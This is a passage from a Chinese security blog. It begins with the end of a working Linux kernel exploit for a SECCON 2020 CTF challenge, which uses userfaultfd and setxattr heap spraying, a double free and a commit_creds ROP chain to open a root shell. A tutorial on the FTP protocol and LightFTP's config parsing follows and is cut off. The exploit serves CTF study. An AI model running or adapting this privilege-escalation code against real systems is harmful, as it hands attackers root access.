class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">leak_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pop(&amp;kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81c37bc0</span>;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    </span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);;</span><br><span class="line">    uc.len = page_size;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">double_free_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pop(page);</span><br><span class="line"></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);;</span><br><span class="line">    uc.len = page_size;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span>  pop_rdi_ret = <span class="number">0xffffffff81034505</span>;</span><br><span class="line"><span class="keyword">size_t</span>  xchg_rax_rdi_ret = <span class="number">0xffffffff81d8df6d</span>;</span><br><span class="line"><span class="keyword">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff8121f89a</span>;</span><br><span class="line"><span class="keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81600a34</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">hijack_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    </span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>); </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg error!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        close(seq_fd_reserve[i]);</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    xchg_rax_rdi_ret += kernel_offset;</span><br><span class="line">    mov_rdi_rax_pop_rbp_ret += kernel_offset;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">    commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    </span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);;</span><br><span class="line">    uc.len = page_size;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0001</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;push!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0002</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pop!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>      data[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span>        *uffd_buf_leak;</span><br><span class="line">    <span class="keyword">char</span>        *uffd_buf_uaf;</span><br><span class="line">    <span class="keyword">char</span>        *uffd_buf_hack;</span><br><span class="line">    <span class="keyword">int</span>         pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span>         shm_id;</span><br><span class="line">    <span class="keyword">char</span>        *shm_addr;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffd_buf_leak = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfault(uffd_buf_leak, page_size, leak_handler);</span><br><span class="line"></span><br><span class="line">    shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    push(uffd_buf_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    uffd_buf_uaf = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfault(uffd_buf_uaf, page_size, double_free_handler);</span><br><span class="line"></span><br><span class="line">    push(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    pop(uffd_buf_uaf);</span><br><span class="line"></span><br><span class="line">    uffd_buf_hack = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, page_size * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfault(uffd_buf_hack + page_size, page_size, hijack_handler);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, <span class="number">0xffffffff814d51c0</span> + kernel_offset);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(uffd_buf_hack + page_size - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;    <span class="comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;name&quot;</span>, uffd_buf_hack + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>多谢大佬的博客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266898#h3-6">从 SECCON2020 一道 kernel pwn 看 userfaultfd + setxattr “堆占位”技术</a></p>
<p>学到了不少东西，但对 pt_regs 还不太熟悉</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/21/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9AFTP%E5%8D%8F%E8%AE%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/21/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9AFTP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">网络相关知识：FTP协议</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-21 11:05:04 / Modified: 11:06:36" itemprop="dateCreated datePublished" datetime="2023-01-21T11:05:04+08:00">2023-01-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>FTP 协议简析</strong></p>
<p>FTP（File Transfer Protocol）是 TCP/IP 协议组中的协议之一，FTP 的工作就是完成两台计算机之间的拷贝</p>
<p>在 TCP/IP 协议中， 需要两个端口，一个是数据端口，一个是控制端口</p>
<ul>
<li>控制端口一般为21，而数据端口不一定是20，这和 FTP 的应用模式有关：<ul>
<li>如果是主动模式，应该为20</li>
<li>如果为被动模式，由服务器端和客户端协商而定</li>
</ul>
</li>
<li>FTP 协议要用到两个 TCP 连接：<ul>
<li>一个是命令链路，用来在 FTP 客户端与服务器之间传递命令</li>
<li>另一个是数据链路，用来上传或下载数据 </li>
</ul>
</li>
</ul>
<p><strong>主动模式与被动模式</strong></p>
<p>FTP 支持两种模式，一种方式叫做 Standard（也就是 PORT 方式，主动方式），一种是 Passive（也就是 PASV，被动方式），下面介绍一个这两种方式的工作原理：</p>
<p>主动 FTP ：</p>
<ul>
<li>命令连接：客户端向服务器的 FTP 端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路<ul>
<li>客户端 &gt;1024 端口 → 服务器 21 端口</li>
</ul>
</li>
<li>数据连接：客户端在命令链路上用 PORT 命令告诉服务器自己开启的端口，于是服务器从自己的 20 端口去连接客户端开启的端口并传输数据<ul>
<li>客户端 &gt;1024 端口 ← 服务器 20 端口</li>
</ul>
</li>
</ul>
<p>被动 FTP ：</p>
<ul>
<li>命令连接：客户端向服务器的 FTP 端口（默认是21）发送连接请求，服务器接受连接，建立一条命令链路 <ul>
<li>客户端 &gt;1024 端口 → 服务器 21 端口</li>
</ul>
</li>
<li>数据连接：客户端在命令链路上用 PASV 命令告诉服务器使用被动模式，于是服务器开启一个端口专门提供给客户端使用，然后客户端主动连接服务器端口来传输数据<ul>
<li>客户端 &gt;1024 端口 → 服务器 &gt; 1024 端口</li>
</ul>
</li>
</ul>
<p><strong>FTP 服务器的代码实现</strong></p>
<p>FTP 需要实现的功能如下：</p>
<ul>
<li>读取配置信息</li>
<li>与目标主机建立连接（使用 socket）</li>
<li>实现 FTP 命令集</li>
</ul>
<p>这里就以轻量级的 FTP 服务器 <code>LightFTP</code> 为例，来学习一下 FTP 服务器的代码实现</p>
<p><strong>LightFTP 读取配置信息</strong></p>
<p>在 <code>LightFTP</code> 中，使用 <code>config_parse</code> 函数来读取文件信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">config_parse</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *pcfg,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *section_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *key_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span>            *value,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span>   value_size_max)</span></span></span><br></pre></td></tr></table></figure>
<p>该函数的参数如下：</p>
<ul>
<li><code>pcfg</code>：初始化函数 <code>config_init</code> 返回的缓冲区（配置文件 <code>fftp.conf</code> 中的内容被 Read 入其中）</li>
<li><code>section_name</code>：配置段名称，在配置文件 <code>fftp.conf</code> 中被大括号 <code>[]</code> 括起来的内容，用于区分某段配置（初始化配置名称为 <code>ftpconfig</code>）</li>
<li><code>key_name</code>：关键字名称，记录有在配置文件 <code>fftp.conf</code> 中写入的关键信息，程序初始化时会把等号 <code>=</code> 后面的内容读入内存</li>
<li><code>value</code>：用于外传数据的指针（程序会把目标 <code>key_name</code> 对应的值写入 <code>value</code> 中）</li>
<li><code>value_size_max</code>：用于表示 <code>value</code> 的最大值</li>
</ul>
<p>为了理解这些参数，我们需要其他代码进行辅助，就从 <code>config_init</code> 函数开始：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">config_init</span><span class="params">(<span class="keyword">char</span> *cfg_filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>		f_config;</span><br><span class="line">	<span class="keyword">char</span>	*buffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">off_t</span>	fsz;</span><br><span class="line"></span><br><span class="line">	f_config = open(cfg_filename, O_RDONLY);</span><br><span class="line">	<span class="keyword">while</span> (f_config != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		fsz = lseek(f_config, <span class="number">0L</span>, SEEK_END) + <span class="number">1</span>;</span><br><span class="line">		lseek(f_config, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">		buffer = x_malloc(fsz);</span><br><span class="line"></span><br><span class="line">		fsz = read(f_config, buffer, fsz);</span><br><span class="line">		buffer[fsz] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (f_config != <span class="number">-1</span>)</span><br><span class="line">		close(f_config);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序默认的 <code>cfg_filename</code> 就是 <code>fftp.conf</code></li>
<li>这个函数的功能就是把配置文件读取到本地内存 <code>buffer</code> 中，然后返回 <code>buffer</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">	cfg = config_init(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	cfg = config_init(CONFIG_FILE_NAME);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">	g_cfg.BindToInterface = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (config_parse(cfg, CONFIG_SECTION_NAME, <span class="string">&quot;interface&quot;</span>, textbuf, bufsize))</span><br><span class="line">		g_cfg.BindToInterface = inet_addr(textbuf);</span><br><span class="line"></span><br><span class="line">	g_cfg.ExternalInterface = inet_addr(<span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (config_parse(cfg, CONFIG_SECTION_NAME, <span class="string">&quot;external_ip&quot;</span>, textbuf, bufsize))</span><br><span class="line">		g_cfg.ExternalInterface = inet_addr(textbuf);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>config_init</code> 的返回值，将会放入 <code>config_parse</code> 中（作为第一个参数 <code>pcfg</code>）</li>
</ul>
<p>接下来看一看配置文件 <code>fftp.conf</code> 的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[ftpconfig]</span><br><span class="line">port=<span class="number">21</span> <span class="comment">/* 要将服务器绑定到的端口号 */</span></span><br><span class="line">maxusers=<span class="number">10</span> <span class="comment">/* 与服务器的最大连接数,可同时建立 */</span></span><br><span class="line">interface=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="comment">/* 要绑定到的接口IP,使用0.0.0.0侦听任何可用接口,默认值:127.0.0.1 */</span></span><br><span class="line">local_mask=<span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span> <span class="comment">/* 本地网络的IP掩码,这将有助于服务器区分本地客户端和互联网客户端,默认值:255.255.255.0 */</span></span><br><span class="line"></span><br><span class="line">minport=<span class="number">30000</span> <span class="comment">/* 数据连接的端口范围,您可以使用它在网关设备上配置端口转发 */</span></span><br><span class="line">maxport=<span class="number">60000</span></span><br><span class="line"></span><br><span class="line">goodbyemsg=Goodbye!</span><br><span class="line">keepalive=<span class="number">1</span> <span class="comment">/* 发送激活数据包(某些NAT可能需要这样做) */</span></span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">pswd=* <span class="comment">/* 表示“任何密码都匹配” */</span></span><br><span class="line">accs=readonly <span class="comment">/* 不允许登录 */</span></span><br><span class="line">root=/server/data/</span><br><span class="line">    </span><br><span class="line">[uploader]</span><br><span class="line">pswd=Weakuploaderpassword111</span><br><span 